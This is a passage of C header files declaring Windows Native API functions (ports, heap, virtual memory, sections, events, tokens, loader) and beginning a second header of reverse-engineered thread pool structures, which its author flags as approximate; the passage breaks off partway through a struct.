    MaxMessageLength - Optionally points to a variable that receives the size,
        in bytes, of the largest message that can be sent through the port.

    ConnectionInformation - Optionally points to a caller-allocated
        buffer or variable that specifies connect data to send to the listener,
        and receives connect data sent by the listener.

    ConnectionInformationLength - Optionally points to a variable that
        specifies the size, in bytes, of the connect data to send
        to the listener, and receives the size of the connect data
        sent by the listener.

--*/

NTSYSAPI
NTSTATUS
NTAPI
NtConnectPort(
    OUT PHANDLE PortHandle,
    IN  PUNICODE_STRING PortName,
    IN  PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    IN  OUT PPORT_VIEW ClientView OPTIONAL,
    OUT PREMOTE_PORT_VIEW ServerView OPTIONAL,
    OUT PULONG MaxMessageLength OPTIONAL,
    IN  OUT PVOID ConnectionInformation OPTIONAL,
    IN  OUT PULONG ConnectionInformationLength OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwConnectPort(
    OUT PHANDLE PortHandle,
    IN  PUNICODE_STRING PortName,
    IN  PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    IN  OUT PPORT_VIEW ClientView OPTIONAL,
    OUT PREMOTE_PORT_VIEW ServerView OPTIONAL,
    OUT PULONG MaxMessageLength OPTIONAL,
    IN  OUT PVOID ConnectionInformation OPTIONAL,
    IN  OUT PULONG ConnectionInformationLength OPTIONAL
    );


/*++

    NtListenPort
    ============

    Listens on a port for a connection request message on the server side.

    PortHandle - A handle to a port object. The handle doesn't need
        to grant any specific access.

    ConnectionRequest - Points to a caller-allocated buffer
        or variable that receives the connect message sent to
        the port.

--*/


NTSYSAPI
NTSTATUS
NTAPI
NtListenPort(
    IN  HANDLE PortHandle,
    OUT PPORT_MESSAGE RequestMessage
    );

/*++

    NtAcceptConnectPort
    ===================

    Accepts or rejects a connection request on the server side.

    PortHandle - Points to a variable that will receive the port object
        handle if the call is successful.

    PortContext - A numeric identifier to be associated with the port.

    ConnectionRequest - Points to a caller-allocated buffer or variable
        that identifies the connection request and contains any connect
        data that should be returned to requestor of the connection

    AcceptConnection - Specifies whether the connection should
        be accepted or not

    ServerView - Optionally points to a structure describing
        the shared memory region used to send large amounts of data to the
        requestor; if the call is successful, this will be updated

    ClientView - Optionally points to a caller-allocated buffer
        or variable that receives information on the shared memory
        region used by the requestor to send large amounts of data to the
        caller

--*/


NTSYSAPI
NTSTATUS
NTAPI
NtAcceptConnectPort(
    OUT PHANDLE PortHandle,
    IN  PVOID PortContext OPTIONAL,
    IN  PPORT_MESSAGE ConnectionRequest,
    IN  BOOLEAN AcceptConnection,
    IN  OUT PPORT_VIEW ServerView OPTIONAL,
    OUT PREMOTE_PORT_VIEW ClientView OPTIONAL
    );

/*++

    NtCompleteConnectPort
    =====================

    Completes the port connection process on the server side.

    PortHandle - A handle to a port object. The handle doesn't need
        to grant any specific access.

--*/


NTSYSAPI
NTSTATUS
NTAPI
NtCompleteConnectPort(
    IN  HANDLE PortHandle
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwCompleteConnectPort(
    IN  HANDLE PortHandle
    );


/*++

    NtRequestPort
    =============

    Sends a request message to a port (client side)

    PortHandle - A handle to a port object. The handle doesn't need
        to grant any specific access.

    RequestMessage - Points to a caller-allocated buffer or variable
        that specifies the request message to send to the port.

--*/

NTSYSAPI
NTSTATUS
NTAPI
NtRequestPort (
    IN  HANDLE PortHandle,
    IN  PPORT_MESSAGE RequestMessage
    );

/*++

    NtRequestWaitReplyPort
    ======================

    Sends a request message to a port and waits for a reply (client side)

    PortHandle - A handle to a port object. The handle doesn't need
        to grant any specific access.

    RequestMessage - Points to a caller-allocated buffer or variable
        that specifies the request message to send to the port.

    ReplyMessage - Points to a caller-allocated buffer or variable
        that receives the reply message sent to the port.

--*/

NTSYSAPI
NTSTATUS
NTAPI
NtRequestWaitReplyPort(
    IN  HANDLE PortHandle,
    IN  PPORT_MESSAGE RequestMessage,
    OUT PPORT_MESSAGE ReplyMessage
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwRequestWaitReplyPort(
    IN  HANDLE PortHandle,
    IN  PPORT_MESSAGE RequestMessage,
    OUT PPORT_MESSAGE ReplyMessage
    );


/*++

    NtReplyPort
    ===========

    Sends a reply message to a port (Server side)

    PortHandle - A handle to a port object. The handle doesn't need
        to grant any specific access.

    ReplyMessage - Points to a caller-allocated buffer or variable
        that specifies the reply message to send to the port.

--*/


NTSYSAPI
NTSTATUS
NTAPI
NtReplyPort(
    IN  HANDLE PortHandle,
    IN  PPORT_MESSAGE ReplyMessage
    );

/*++

    NtReplyWaitReplyPort
    ====================

    Sends a reply message to a port and waits for a reply message

    PortHandle - A handle to a port object. The handle doesn't need
        to grant any specific access.

    ReplyMessage - Points to a caller-allocated buffer or variable
        that specifies the reply message to send to the port.

--*/

NTSYSAPI
NTSTATUS
NTAPI
NtReplyWaitReplyPort(
    IN  HANDLE PortHandle,
    IN  OUT PPORT_MESSAGE ReplyMessage
    );


/*++

    NtReplyWaitReceivePort
    ======================

    Optionally sends a reply message to a port and waits for a
    message

    PortHandle - A handle to a port object. The handle doesn't need
        to grant any specific access.

    PortContext - Optionally points to a variable that receives
        a numeric identifier associated with the port.

    ReplyMessage - Optionally points to a caller-allocated buffer
        or variable that specifies the reply message to send to the port.

    ReceiveMessage - Points to a caller-allocated buffer or variable
        that receives the message sent to the port.

--*/

NTSYSAPI
NTSTATUS
NTAPI
NtReplyWaitReceivePort(
    IN  HANDLE PortHandle,
    OUT PVOID *PortContext OPTIONAL,
    IN  PPORT_MESSAGE ReplyMessage OPTIONAL,
    OUT PPORT_MESSAGE ReceiveMessage
    );

//-----------------------------------------------------------------------------
// Heap functions

#define HEAP_NO_SERIALIZE               0x00000001
#define HEAP_GROWABLE                   0x00000002
#define HEAP_GENERATE_EXCEPTIONS        0x00000004
#define HEAP_ZERO_MEMORY                0x00000008
#define HEAP_REALLOC_IN_PLACE_ONLY      0x00000010
#define HEAP_TAIL_CHECKING_ENABLED      0x00000020
#define HEAP_FREE_CHECKING_ENABLED      0x00000040
#define HEAP_DISABLE_COALESCE_ON_FREE   0x00000080
#define HEAP_CREATE_ALIGN_16            0x00010000
#define HEAP_CREATE_ENABLE_TRACING      0x00020000
#define HEAP_MAXIMUM_TAG                0x0FFF
#define HEAP_PSEUDO_TAG_FLAG            0x8000

//
// Data structure for heap definition. This includes various
// sizing parameters and callback routines, which, if left NULL,
// result in default behavior
//

typedef struct RTL_HEAP_PARAMETERS {
    ULONG Length;        //sizeof(RTL_HEAP_PARAMETERS)
    ULONG SegmentReserve;
    ULONG SegmentCommit;
    ULONG DeCommitFreeBlockThreshold;
    ULONG DeCommitTotalFreeThreshold;
    ULONG MaximumAllocationSize;
    ULONG VirtualMemoryThreshold;
    ULONG InitialCommit;
    ULONG InitialReserve;
    PVOID CommitRoutine;
    ULONG Reserved;
} RTL_HEAP_PARAMETERS, *PRTL_HEAP_PARAMETERS;


#define RtlProcessHeap() (HANDLE)(NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap)


NTSYSAPI
HANDLE
NTAPI
RtlCreateHeap (
    IN ULONG Flags,
    IN PVOID BaseAddress OPTIONAL,
    IN ULONG SizeToReserve,
    IN ULONG SizeToCommit,
    IN BOOLEAN Lock OPTIONAL,
    IN PRTL_HEAP_PARAMETERS Definition OPTIONAL
    );


NTSYSAPI
ULONG
NTAPI
RtlDestroyHeap (
    IN HANDLE HeapHandle
    );


NTSYSAPI
PVOID
NTAPI
RtlAllocateHeap (
    IN HANDLE HeapHandle,
    IN ULONG Flags,
    IN ULONG Size
    );


NTSYSAPI
BOOLEAN
NTAPI
RtlFreeHeap (
    IN HANDLE HeapHandle,
    IN ULONG Flags,
    IN PVOID Address
    );


NTSYSAPI
ULONG
NTAPI
RtlCompactHeap (
    IN HANDLE HeapHandle,
    IN ULONG Flags
    );


NTSYSAPI
BOOLEAN
NTAPI
RtlLockHeap (
    IN HANDLE HeapHandle
    );


NTSYSAPI
BOOLEAN
NTAPI
RtlUnlockHeap (
    IN HANDLE HeapHandle
    );


NTSYSAPI
PVOID
NTAPI
RtlReAllocateHeap (
    IN HANDLE HeapHandle,
    IN ULONG Flags,
    IN PVOID Address,
    IN ULONG Size
    );


NTSYSAPI
ULONG
NTAPI
RtlSizeHeap (
    IN HANDLE HeapHandle,
    IN ULONG Flags,
    IN PVOID Address
    );


NTSYSAPI
BOOLEAN
NTAPI
RtlValidateHeap (
    IN HANDLE HeapHandle,
    IN ULONG Flags,
    IN PVOID Address OPTIONAL
    );


//-----------------------------------------------------------------------------
// Virtual memory functions

NTSYSAPI
NTSTATUS
NTAPI
NtAllocateVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PULONG RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwAllocateVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PULONG RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
    );


NTSYSAPI
NTSTATUS
NTAPI
NtFreeVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PULONG RegionSize,
    IN ULONG FreeType
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwFreeVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PULONG RegionSize,
    IN ULONG FreeType
    );


NTSYSAPI
NTSTATUS
NTAPI
NtReadVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    OUT PVOID Buffer,
    IN ULONG NumberOfBytesToRead,
    OUT PULONG NumberOfBytesRead OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN ULONG NumberOfBytesToWrite,
    OUT PULONG NumberOfBytesWritten OPTIONAL
    );


//-----------------------------------------------------------------------------
// Section functions

typedef enum _SECTION_INHERIT
{
    ViewShare = 1,
    ViewUnmap = 2

} SECTION_INHERIT;


typedef enum _SECTION_INFORMATION_CLASS
{
    SectionBasicInformation,
    SectionImageInformation

} SECTION_INFORMATION_CLASS, *PSECTION_INFORMATION_CLASS;


/*++

    NtCreateSection
    ===============

    Creates a section object.

    SectionHandle - Points to a variable that will receive the section
        object handle if the call is successful.

    DesiredAccess - Specifies the type of access that the caller requires
        to the section object. This parameter can be zero, or any combination
        of the following flags:

        SECTION_QUERY       - Query access
        SECTION_MAP_WRITE   - Can be written when mapped
        SECTION_MAP_READ    - Can be read when mapped
        SECTION_MAP_EXECUTE - Can be executed when mapped
        SECTION_EXTEND_SIZE - Extend access
        SECTION_ALL_ACCESS  - All of the preceding +
                              STANDARD_RIGHTS_REQUIRED

    ObjectAttributes - Points to a structure that specifies the object s attributes.
        OBJ_OPENLINK is not a valid attribute for a section object.

    MaximumSize - Optionally points to a variable that specifies the size,
        in bytes, of the section. If FileHandle is zero, the size must be
        specified; otherwise, it can be defaulted from the size of the file
        referred to by FileHandle.

    SectionPageProtection - The protection desired for the pages
        of the section when the section is mapped. This parameter can take
        one of the following values:

        PAGE_READONLY
        PAGE_READWRITE
        PAGE_WRITECOPY
        PAGE_EXECUTE
        PAGE_EXECUTE_READ
        PAGE_EXECUTE_READWRITE
        PAGE_EXECUTE_WRITECOPY

    AllocationAttributes - The attributes for the section. This parameter must
        be a combination of the following values:

        SEC_BASED     0x00200000    // Map section at same address in each process
        SEC_NO_CHANGE 0x00400000    // Disable changes to protection of pages
        SEC_IMAGE     0x01000000    // Map section as an image
        SEC_VLM       0x02000000    // Map section in VLM region
        SEC_RESERVE   0x04000000    // Reserve without allocating pagefile storage
        SEC_COMMIT    0x08000000    // Commit pages; the default behavior
        SEC_NOCACHE   0x10000000    // Mark pages as non-cacheable

    FileHandle - Identifies the file from which to create the section object.
        The file must be opened with an access mode compatible with the protection
        flags specified by the Protect parameter. If FileHandle is zero,
        the function creates a section object of the specified size backed
        by the paging file rather than by a named file in the file system.

--*/


NTSYSAPI
NTSTATUS
NTAPI
NtCreateSection(
    OUT PHANDLE SectionHandle,
    IN  ACCESS_MASK DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN  PLARGE_INTEGER MaximumSize OPTIONAL,
    IN  ULONG SectionPageProtection,
    IN  ULONG AllocationAttributes,
    IN  HANDLE FileHandle OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwCreateSection(
    OUT PHANDLE SectionHandle,
    IN  ACCESS_MASK DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN  PLARGE_INTEGER MaximumSize OPTIONAL,
    IN  ULONG SectionPageProtection,
    IN  ULONG AllocationAttributes,
    IN  HANDLE FileHandle OPTIONAL
    );

NTSYSAPI NTSTATUS NTAPI ZwCreateDirectoryObject(
  PHANDLE            DirectoryHandle,
  ACCESS_MASK        DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI NTSTATUS NTAPI NtCreateDirectoryObject(
  PHANDLE            DirectoryHandle,
  ACCESS_MASK        DesiredAccess,
  POBJECT_ATTRIBUTES ObjectAttributes);
  
NTSYSAPI
NTSTATUS
NTAPI
NtOpenSection (
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwOpenSection (
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSYSAPI
NTSTATUS
NTAPI
NtMapViewOfSection (
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN ULONG CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PULONG ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Protect
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwMapViewOfSection (
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG ZeroBits,
    IN ULONG CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PULONG ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Protect
    );


NTSYSAPI
NTSTATUS
NTAPI
NtUnmapViewOfSection (
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwUnmapViewOfSection (
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress
    );


NTSYSAPI
NTSTATUS
NTAPI
NtExtendSection (
    IN HANDLE SectionHandle,
    IN OUT PLARGE_INTEGER SectionSize
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwExtendSection (
    IN HANDLE SectionHandle,
    IN OUT PLARGE_INTEGER SectionSize
    );


NTSYSAPI
NTSTATUS
NTAPI
NtQuerySection (
    IN HANDLE SectionHandle,
    IN SECTION_INFORMATION_CLASS SectionInformationClass,
    OUT PVOID SectionInformation,
    IN ULONG Length,
    OUT PULONG ResultLength OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwQuerySection (
    IN HANDLE SectionHandle,
    IN SECTION_INFORMATION_CLASS SectionInformationClass,
    OUT PVOID SectionInformation,
    IN ULONG Length,
    OUT PULONG ResultLength OPTIONAL
    );


//-----------------------------------------------------------------------------
// Synchronization

//
// Wait type
//

typedef enum _WAIT_TYPE {
    WaitAll,
    WaitAny
    } WAIT_TYPE;


NTSYSAPI
NTSTATUS
NTAPI
NtWaitForSingleObject (
    IN HANDLE Handle,
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER Timeout OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwWaitForSingleObject (
    IN HANDLE Handle,
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER Timeout OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
NtWaitForMultipleObjects (
    IN ULONG Count,
    IN HANDLE Handle[],
    IN WAIT_TYPE WaitType,
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER Timeout OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwWaitForMultipleObjects (
    IN ULONG Count,
    IN HANDLE Handle[],
    IN WAIT_TYPE WaitType,
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER Timeout OPTIONAL
    );


//-----------------------------------------------------------------------------
// Event support

typedef enum _EVENT_INFORMATION_CLASS {
    EventBasicInformation    // = 0
} EVENT_INFORMATION_CLASS;

typedef struct _EVENT_BASIC_INFORMATION {
    EVENT_TYPE EventType;
    LONG EventState;
} EVENT_BASIC_INFORMATION, *PEVENT_BASIC_INFORMATION;

//
// Event handling routines
//


NTSYSAPI
NTSTATUS
NTAPI
NtCreateEvent (
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN EVENT_TYPE EventType,
    IN BOOLEAN InitialState
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwCreateEvent (
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN EVENT_TYPE EventType,
    IN BOOLEAN InitialState
    );


NTSYSAPI
NTSTATUS
NTAPI
NtClearEvent (
    IN HANDLE Handle
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwClearEvent (
    IN HANDLE Handle
    );


NTSYSAPI
NTSTATUS
NTAPI
NtPulseEvent (
    IN HANDLE Handle,
    OUT PLONG PreviousState OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwPulseEvent (
    IN HANDLE Handle,
    OUT PLONG PreviousState OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
NtResetEvent (
    IN HANDLE Handle,
    OUT PLONG PreviousState OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwResetEvent (
    IN HANDLE Handle,
    OUT PLONG PreviousState OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
NtSetEvent (
    IN HANDLE Handle,
    OUT PLONG PreviousState OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwSetEvent (
    IN HANDLE Handle,
    OUT PLONG PreviousState OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
NtOpenEvent (
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwOpenEvent (
    OUT PHANDLE EventHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSYSAPI
NTSTATUS
NTAPI
NtQueryEvent (
    IN HANDLE EventHandle,
    IN EVENT_INFORMATION_CLASS EventInfoClass,
    OUT PVOID EventInfo,
    IN ULONG Length,
    OUT PULONG ResultLength OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
ZwQueryEvent (
    IN HANDLE EventHandle,
    IN EVENT_INFORMATION_CLASS EventInfoClass,
    OUT PVOID EventInfo,
    IN ULONG Length,
    OUT PULONG ResultLength OPTIONAL
    );


//-----------------------------------------------------------------------------
// Security descriptor functions

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateSecurityDescriptor (
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN ULONG Revision
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlSetDaclSecurityDescriptor(
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN BOOLEAN DaclPresent,
    IN PACL Dacl OPTIONAL,
    IN BOOLEAN DaclDefaulted OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlSetOwnerSecurityDescriptor (
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN PSID Owner OPTIONAL,
    IN BOOLEAN OwnerDefaulted OPTIONAL
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlAllocateAndInitializeSid(
    IN PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
    IN UCHAR SubAuthorityCount,
    IN ULONG SubAuthority0,
    IN ULONG SubAuthority1,
    IN ULONG SubAuthority2,
    IN ULONG SubAuthority3,
    IN ULONG SubAuthority4,
    IN ULONG SubAuthority5,
    IN ULONG SubAuthority6,
    IN ULONG SubAuthority7,
    OUT PSID *Sid
    );


NTSYSAPI
ULONG
NTAPI
RtlLengthSid (
    IN PSID Sid
    );


NTSYSAPI
BOOLEAN
NTAPI
RtlEqualSid (
    IN PSID Sid1,
    IN PSID Sid2
    );


NTSYSAPI
PVOID
NTAPI
RtlFreeSid(
    IN PSID Sid
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlCreateAcl(
    IN PACL Acl,
    IN ULONG AclLength,
    IN ULONG AclRevision
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessAllowedAce(
    IN OUT PACL Acl,
    IN ULONG AceRevision,
    IN ACCESS_MASK AccessMask,
    IN PSID Sid
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlAddAccessAllowedAceEx(
    IN OUT PACL Acl,
    IN ULONG AceRevision,
    IN ULONG AceFlags,
    IN ULONG AccessMask,
    IN PSID Sid
    );

//-----------------------------------------------------------------------------
// Token functions

NTSYSAPI
NTSTATUS
NTAPI
NtOpenProcessToken(
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    OUT PHANDLE TokenHandle
    );


NTSYSAPI
NTSTATUS
NTAPI
NtOpenThreadToken(
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN BOOLEAN OpenAsSelf,
    OUT PHANDLE TokenHandle
    );


NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationToken(
    IN HANDLE  TokenHandle,
    IN TOKEN_INFORMATION_CLASS  TokenInformationClass,
    OUT PVOID  TokenInformation,
    IN ULONG  TokenInformationLength,
    OUT PULONG  ReturnLength
    );


NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationToken(
    IN HANDLE  TokenHandle,
    IN TOKEN_INFORMATION_CLASS  TokenInformationClass,
    IN PVOID  TokenInformation,
    IN ULONG  TokenInformationLength
    );


NTSYSAPI
NTSTATUS
NTAPI
NtAdjustPrivilegesToken(
    IN HANDLE TokenHandle,
    IN BOOLEAN DisableAllPrivileges,
    IN PTOKEN_PRIVILEGES NewState OPTIONAL,
    IN ULONG BufferLength OPTIONAL,
    IN PTOKEN_PRIVILEGES PreviousState OPTIONAL,
    OUT PULONG ReturnLength
    );


NTSYSAPI
NTSTATUS
NTAPI
NtDuplicateToken(
    IN HANDLE ExistingTokenHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN BOOLEAN EffectiveOnly,
    IN TOKEN_TYPE TokenType,
    OUT PHANDLE NewTokenHandle
    );


NTSYSAPI
NTSTATUS
NTAPI
NtCompareTokens(
    IN  HANDLE FirstTokenHandle,
    IN  HANDLE SecondTokenHandle,
    OUT PBOOLEAN IdenticalTokens
    );


//-----------------------------------------------------------------------------
// Symbolic links

//
// Object Manager Symbolic Link Specific Access Rights.
//

#ifndef SYMBOLIC_LINK_QUERY
#define SYMBOLIC_LINK_QUERY (0x0001)
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)
#endif

NTSYSAPI
NTSTATUS
NTAPI
NtOpenSymbolicLinkObject (
    OUT PHANDLE SymbolicLinkHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );


NTSYSAPI
NTSTATUS
NTAPI
NtQuerySymbolicLinkObject (
    IN HANDLE SymbolicLinkHandle,
    OUT PUNICODE_STRING NameString,
    OUT PULONG ResultLength OPTIONAL
    );

//-----------------------------------------------------------------------------
// Loader functions

NTSYSAPI
NTSTATUS
NTAPI
LdrGetDllHandle(
    IN PWSTR DllPath OPTIONAL,
    IN PULONG DllCharacteristics OPTIONAL,
    IN PUNICODE_STRING DllName,
    OUT PVOID * DllHandle
    );


NTSYSAPI
NTSTATUS
NTAPI
LdrGetProcedureAddress(
    IN PVOID DllHandle,
    IN PANSI_STRING ProcedureName OPTIONAL,
    IN ULONG ProcedureNumber OPTIONAL,
    OUT PVOID *ProcedureAddress
    );


NTSYSAPI
NTSTATUS
NTAPI
LdrLoadDll(
    IN PWSTR DllPath OPTIONAL,
    IN PULONG DllCharacteristics OPTIONAL,
    IN PUNICODE_STRING DllName,
    OUT PVOID *DllHandle
    );

NTSYSAPI
NTSTATUS
NTAPI
LdrFindEntryForAddress(
  IN PVOID Address,
  OUT PLDR_DATA_TABLE_ENTRY *Module
  );

NTSYSAPI
VOID
NTAPI
  RtlGetCallersAddress(
  OUT PVOID  *CallersAddress,
  OUT PVOID  *CallersCaller
  );

//-----------------------------------------------------------------------------
// Functions dealing with NTSTATUS and Win32 error

NTSYSAPI
ULONG
NTAPI
RtlNtStatusToDosError(
    NTSTATUS Status
    );


NTSYSAPI
ULONG
NTAPI
RtlNtStatusToDosErrorNoTeb(
    NTSTATUS Status
    );


NTSYSAPI
NTSTATUS
NTAPI
RtlGetLastNtStatus(
    );


NTSYSAPI
ULONG
NTAPI
RtlGetLastWin32Error(
    );


NTSYSAPI
VOID
NTAPI
RtlSetLastWin32Error(
    ULONG WinError
    );


NTSYSAPI
VOID
NTAPI
RtlSetLastWin32ErrorAndNtStatusFromNtStatus(
    NTSTATUS Status
    );


//-----------------------------------------------------------------------------
// I/O functions


NTSYSAPI
NTSTATUS
NTAPI
NtDisplayString(
    IN PUNICODE_STRING String
    );


#ifdef __cplusplus
} // extern "C"
#endif

#endif // __NTDLL_H__

```

`ntlib/nttpp.h`:

```h
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
/**
  These structures were reverse engineered and are not an accurate representation
  of thread pool structures. They are based on analyzing private API in NTDLL.dll
  
  Use with caution. - odzhan
  Last updated: March 2019
*/
#ifndef TPP_H
#define TPP_H

#include "../NTlib/ntddk.h"

typedef struct _TP_ALPC *PTP_ALPC;

typedef void (WINAPI *PTP_ALPC_CALLBACK)(PTP_CALLBACK_INSTANCE Instance, 
  LPVOID Context, PTP_ALPC TpAlpc, LPVOID Reserved);

typedef struct _TP_SIMPLE_CALLBACK {
    PVOID                             Function;
    PVOID                             Context;
} TP_SIMPLE_CALLBACK;

typedef struct _TP_CLEANUP_GROUP {
    ULONG                             Version;
    SRWLOCK                           Lock;
    LIST_ENTRY                        GroupList1;
    PTP_SIMPLE_CALLBACK               FinalizationCallback;
    LIST_ENTRY                        GroupList2;
    ULONG64                           Unknown1;
    LIST_ENTRY                        GroupList3;
} TP_CLEANUP_GROUP, *PTP_CLEANUP_GROUP;
    
typedef struct _TP_CALLBACK_OBJECT {
    ULONG                             RefCount;
    PVOID                             CleanupGroupMember;
    PTP_CLEANUP_GROUP                 CleanupGroup;
    PTP_CLEANUP_GROUP_CANCEL_CALLBACK CleanupGroupCancelCallback;
    PTP_SIMPLE_CALLBACK               FinalizationCallback;
    LIST_ENTRY                        WorkList;
    ULONG64                           Barrier;
    ULONG64                           Unknown1;
    SRWLOCK                           SharedLock;
    TP_SIMPLE_CALLBACK                Callback;
    PACTIVATION_CONTEXT               ActivationContext;
    ULONG64                           SubProcessTag;
    GUID                              ActivityId;
    BOOL                              WorkingOnBehalfTicket;
    PVOID                             RaceDll;
    PTP_POOL                          Pool;
    LIST_ENTRY                        GroupList;
    ULONG                             Flags;
    TP_SIMPLE_CALLBACK                CallerAddress;
    TP_CALLBACK_PRIORITY              CallbackPriority;
} TP_CALLBACK_OBJECT, *PTP_CALLBACK_OBJECT;

typedef struct _TP_POOL {
    ULONG64                           RefCount;
    ULONG64                           Version;
    LIST_ENTRY                        NumaRelatedList;
    LIST_ENTRY                        PoolList;
    PVOID                             NodeList;
    
    HANDLE                            WorkerFactory;
    HANDLE                            IoCompletion;
    SRWLOCK                           PoolLock;
    LIST_ENTRY                        UnknownList1;
